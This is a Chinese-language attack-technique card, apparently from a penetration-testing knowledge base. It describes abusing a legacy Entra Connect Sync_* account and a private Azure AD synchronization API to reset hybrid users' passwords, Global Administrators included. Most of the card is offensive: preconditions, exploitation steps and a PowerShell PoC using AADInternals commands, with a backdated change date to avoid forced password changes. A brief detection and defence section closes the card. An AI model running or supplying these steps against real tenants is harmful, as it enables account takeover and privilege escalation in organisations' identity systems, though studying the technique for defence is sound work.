---
id: cloud-cloud-iam-entra-connect-sync-account-password-reset-private-api
title: Entra Connect Sync_* 账户滥用：私有 Azure AD Synchronization API 重置混合用户密码
type: scenario
domain: cloud
path: cloud/cloud-iam
technique: entra-connect-sync-account-password-reset-private-api
tags:
- entra-id
- azure-ad
- cloud-iam
- password-reset
- sync-account
- aadinternals
- hybrid-identity
- privilege-escalation
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V208
  verified_at: '2026-11-07T02:28:05+08:00'
  notes: 已对照原文与25-28图核对：Get-AADIntAccessTokenForAADGraph、Get-AADIntSyncObjects、Set-AADIntUserPassword 与 provisioningservice.svc、SourceAnchor、PHS/混合账户/MFA 限制、Result=0 均一致。未验证点：未在真实租户执行；无受影响版本；frontmatter 无 sources/source_url。
url: /docs/cloud/cloud-iam/cloud-cloud-iam-entra-connect-sync-account-password-reset-private-api/
draft: false
kb_aliases:
- Sync_* 账户重置密码
- Directory Synchronization Accounts 重置密码
- AADInternals Set-AADIntUserPassword
- Azure AD Synchronization API
- provisioningservice.svc 密码重置
---

## 一句话结论

旧版 Entra Connect 的 `Sync_*` 用户属于 “Directory Synchronization Accounts”（DSA）角色；拿到其口令（或 DSA 角色成员身份）后，可用 AADInternals 的 `Get-AADIntAccessTokenForAADGraph`、`Get-AADIntSyncObjects`、`Set-AADIntUserPassword` 调用私有 “Azure AD Synchronization” API（`https://adminwebservice.microsoftonline.com/provisioningservice.svc`），按 `SourceAnchor` 定位混合账户并直接写入新密码/修改密码时间，从而在云侧重置目标（含 Global Administrator）密码；限制是只对同步自本地 AD 的混合账户有效、依赖 PHS，且目标启用 MFA/FIDO2 时重置后的密码无法直接认证。

## 原理

- **DSA 与私有同步 API**：DSA 角色的部分能力不以 Entra 公开角色 action 列出，而是体现在私有 “Azure AD Synchronization” API 上；该 API 与公开的 Microsoft Entra Synchronization API、Azure AD Provisioning API 不同，AADInternals 已实现其调用。
- **Sync_* 账户身份**：旧版 Entra Connect 创建 `SYNC_<hostname>_<random>@tenant` 用户，密码永不过期、保存在 Connect Sync 配置中，并被赋予 DSA 角色；2025-05-28 起新版本改用 `ConnectSyncProvisioning_*` 服务主体+证书，但历史租户可能仍有 `Sync_*` 用户。
- **SourceAnchor 的作用**：同步 API 用 `SourceAnchor`/`CloudAnchor` 唯一定位本地对象与云端对象的映射；`Get-AADIntSyncObjects` 列出 `UserPrincipalName`、`SourceAnchor`、`CloudAnchor` 后，即可对目标写入密码。
- **为什么能重置**：DSA 角色在私有同步 API 上拥有修改同步用户属性的隐式权限，密码写入后通过 PHS/同步流程生效；`-ChangeDate (Get-Date).AddYears(-1)` 用于绕过“密码最近修改”限制/强制下次变更。
- **限制**：只对混合账户（从本地 AD 同步）有效；需要 PHS 启用（DSA 本身有权限启用 PHS）；目标若启用 MFA/FIDO2，密码虽被重置但登录仍需第二因素，实战价值下降；2024-08 后公开权限被删，但私有 API 的隐式能力仍在，因此该路径在混合账户上仍可能成立。

## 触发条件

- 已获得 `Sync_*` 账户口令（如从 ADSync 数据库解密）或已把被控账户加入 DSA 角色。
- 目标租户仍使用旧版 `Sync_*` 用户/同步账户，且未强制 MFA/FIDO2（或攻击者能绕过第二因素）。
- 目标账户是本地 AD 同步到 Entra 的混合账户，且租户启用 PHS。
- 攻击者能运行 AADInternals 并访问 `adminwebservice.microsoftonline.com`。

## 利用步骤

1. 获取 AAD Graph 访问令牌并缓存：`Get-AADIntAccessTokenForAADGraph -SaveToCache`（用 `Sync_*` 口令登录）。
2. 列出同步对象，定位目标混合账户：`Get-AADIntSyncObjects | Select UserPrincipalName,SourceAnchor,CloudAnchor | Sort UserPrincipalName`。
3. 记录目标的 `SourceAnchor`（如 `kFcDyVPWUEa+hodylsqB7Q==`）。
4. 重置密码：`Set-AADIntUserPassword -SourceAnchor "<SourceAnchor>" -Password "<New_Password>" -ChangeDate (Get-Date).AddYears(-1)`；返回 `Result=0` 表示成功。
5. 以目标账户 + 新密码登录；若目标启用 MFA/FIDO2，需进一步绕过第二因素，否则只能确认密码已改。

## PoC

```powershell
# 1) 用 Sync_* 账户获取 AAD Graph token
Get-AADIntAccessTokenForAADGraph -SaveToCache

# 2) 列出同步对象，找目标 SourceAnchor
Get-AADIntSyncObjects | Select UserPrincipalName,SourceAnchor,CloudAnchor | Sort UserPrincipalName

# 3) 重置目标（示例为全局管理员账户）
Set-AADIntUserPassword -SourceAnchor "kFcDyVPWUEa+hodylsqB7Q==" `
  -Password "<New_Password>" `
  -ChangeDate (Get-Date).AddYears(-1)
# CloudAnchor Result SourceAnchor
# CloudAnchor 0      kFcDyVPWUEa+hodylsqB7Q==
```

说明：PoC 为原文 AADInternals 命令的复现，未在真实租户执行；原文用该流程成功重置了全局管理员账户密码（Result=0）。

## 变体与关联

- 变体（账户来源）：从 ADSync 数据库解密 `Sync_*` 口令；或直接把被控账户加入 DSA 角色（见关联卡）。
- 变体（目标）：混合用户/Global Administrator；2025-08 之前原文称也可重置仅限云用户（具体以租户/版本为准）；启用 MFA/FIDO2 时密码重置后无法直接登录。
- 变体（前置）：DSA 角色可启用 PHS；若 PHS 未启用，可先用 DSA 权限开启再重置。
- 关联：[[cloud-cloud-iam-entra-connect-dsa-role-hidden-persistence]]（DSA 角色隐藏持久化）；[[pentest-ad-entra-connect-adsync-dual-connector-credential-decrypt]]（从 ADSync 数据库取 Sync_* 凭据）；[[cloud-cloud-iam-entra-dynamic-group-guest-invite-app-role]]（Entra 角色滥用）；[[cloud-cloud-iam-entra-tenant-id-redirect-uri-adminconsent]]。
- 边界：新版 Connect Sync 2.5.3.0+ 改用服务主体+证书后，`Sync_*` 用户不存在；MFA/FIDO2、条件访问、密码保护策略会削弱或阻断利用；微软可能进一步收紧私有 API 隐式权限。

## 检测与防御

- 检测：`Sync_*` 账户在非 Connect 服务器 IP 登录、获取 AAD Graph token；调用 `adminwebservice.microsoftonline.com/provisioningservice.svc` 的异常流量；混合账户密码被非预期重置、`SourceAnchor` 被批量查询；DSA 角色成员异常。
- 防御：淘汰旧版 `Sync_*` 用户，升级到 2.5.3.0+ 服务主体+证书；强制 MFA/FIDO2 与条件访问；监控 DSA 成员与同步 API 调用；限制 `Sync_*` 账户的登录位置；不使用 PHS 时关闭；定期轮换/删除遗留凭据。
